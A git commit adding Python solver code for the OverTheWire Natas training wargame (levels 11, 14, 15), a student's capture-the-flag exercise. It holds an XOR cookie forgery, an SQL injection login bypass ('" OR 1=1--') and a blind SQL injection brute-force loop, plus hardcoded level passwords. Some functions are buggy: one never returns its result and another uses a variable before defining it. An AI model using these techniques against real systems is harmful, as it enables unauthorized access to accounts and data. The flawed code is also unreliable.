2a970d4f4f1fbd92e662f10fe1c8b5f225f22faf
MrZello <pateltejendra23@gmail.com>
2021-10-27 21:07:06 -0500

    add natas levels 11, 14, and 15

--- natas.py
+++ natas.py
@@ -115,3 +115,96 @@ def natas10(passLvl9): #had to cheat a little on what I needed to input
     print(resp.status_code)
     return passwd
 passLvl10 = natas10(passLvl9)
+
+
+import base64
+#passLvl11 = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
+def natas11(passLvl10):
+    url = f'http://natas11:{passLvl10}@natas11.natas.labs.overthewire.org/'
+    resp = requests.get(url)
+    print(resp.status_code)
+    cookie = resp.cookies['data']
+    cookie = cookie[:-3]
+    cookie = cookie + '='
+        
+    def xor(data, key):
+        out = ''
+        for i in range(len(data)):
+            try:
+                out += chr(data[i] ^ key[i%len(key)])
+            except:
+                pass
+        return out
+
+    encrypted = base64.b64decode(cookie)
+    defaultdata = b'{"showpassword":"no", "bgcolor":"#ffffff"}'
+    key = xor(encrypted, defaultdata)
+    key = key[:4]
+
+    editdata = b'{"showpassword":"yes", "bgcolor":"#ffffff"}'
+    madeNewKey = bytes(key, "utf-8")
+    xorCookie = xor(editdata, madeNewKey)
+    
+    byteCookie = bytes(xorCookie, "utf-8")
+    newCookie = base64.b64encode(byteCookie)
+    newCookie = newCookie.decode('utf-8')
+    
+    cookies = {'data': newCookie}
+    resp = requests.get(url, cookies=cookies)
+    
+    reg = '\w{32}'
+    passwd = re.findall(reg, resp.text)[1]
+    print(f'Password obtained from level 11 is:{passwd}')
+passLvl12 = natas11(passLvl10)
+
+
+passLvl13 = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
+def natas14(passLvl13):
+    url = f'http://natas14:{passLvl14}@natas14.natas.labs.overthewire.org/'
+    data = {'username':'" OR 1=1--',
+            'password':'" OR 1=1--',
+            'submit':'submit'}
+    resp = requests.post(url, data = data)
+    print(resp.status_code)
+    reg = '\w{32}'
+    passwd = re.findall(reg, resp.text)[1];
+    print(f'Password obtained from level 14 is:{passwd}')
+    return passwd
+passLvl14 = natas14(passLvl13)
+
+
+from requests.auth import HTTPBasicAuth
+def natas15(passLvl14):
+    url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
+    trueStatement = 'This user exists.'
+    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    passwd = ''
+    letters = ''
+
+    #this for loop was added to make the blind brute force faster (idea from online)
+    for x in chars: 
+        user = f'natas16" AND password LIKE BINARY "%{x}%" "'
+        data = {'username':user,
+                'submit':'submit'}
+        #I kept getting 401 codes so I found this below, got online
+        auth=HTTPBasicAuth('natas15', passLvl14)   
+        resp = requests.post(url, auth=auth, data=data)                        
+        if resp.text.find(trueStatement) != -1:
+            letters += x
+
+    #this for loop does the blind brute forcing
+    for i in range(32):
+        for j in letters:
+            user = f'natas16" AND password LIKE BINARY "{passwd}{j}%" "'
+            data = {'username':user,
+                    'submit':'submit'}
+            #I kept getting 401 codes so I found this below, got online
+            auth=HTTPBasicAuth('natas15', passLvl14)
+            resp = requests.post(url, auth=auth, data=data)
+
+            if resp.text.find(trueStatement) != -1:
+                passwd += j
+                break
+
+    print(f'Password obtained from level 15 is:{passwd}')
+natas15(passLvl14)
